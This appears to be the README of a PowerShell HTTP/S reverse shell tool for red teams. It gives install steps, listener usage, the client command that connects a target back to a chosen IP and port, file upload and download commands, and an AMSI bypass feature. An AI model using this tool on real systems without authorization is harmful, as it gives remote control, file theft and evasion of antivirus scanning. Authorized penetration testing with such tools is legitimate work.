Powershell HTTP/S Reverse Shell
------------

HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol.

![Alt text](images/logo.jpg "Logo")

Installation
------------

```shell
git clone https://github.com/3v4Si0N/HTTP-revshell.git
cd HTTP-revshell/
pip3 install -r requirements.txt
```

server-multisession.py - server multisession
------------

```
This server allows multiple connection of clients.
There is a menu with three basic commands: sessions, interact and exit
     - sessions --> show currently active sessions
     - interact --> interacts with a session (Example: interact <session_id>)
     - exit --> close the application
```
**IMPORTANT**: To change the session press *CTRL+d* to exit the current session without closing it.

server.py - server unisession
------------

Server usage:
```
usage: server.py [-h] [--ssl] [--autocomplete] host port

Process some integers.

positional arguments:
  host            Listen Host
  port            Listen Port

optional arguments:
  -h, --help      show this help message and exit
  --ssl           Send traffic over ssl
  --autocomplete  Autocomplete powershell functions
```

Invoke-WebRev.ps1 - client
------------

Client usage:
```
Import-Module .\Invoke-WebRev.ps1
Invoke-WebRev -ip IP -port PORT [-ssl]
```

Extra functions
------------

```
Upload
    Usage: upload /src/path/file C:\dest\path\file
```

```
Download
    Usage: download C:\src\path\file /dst/path/file
```

Features
------------

    - SSL
    - Proxy Aware
    - Upload Function
    - Download Function
    - Error Control
    - AMSI bypass
    - Multiple sessions [only server-multisession.py]
    - Autocomplete PowerShell functions (optional) [only server.py]

TODO
------------

    - ??
    
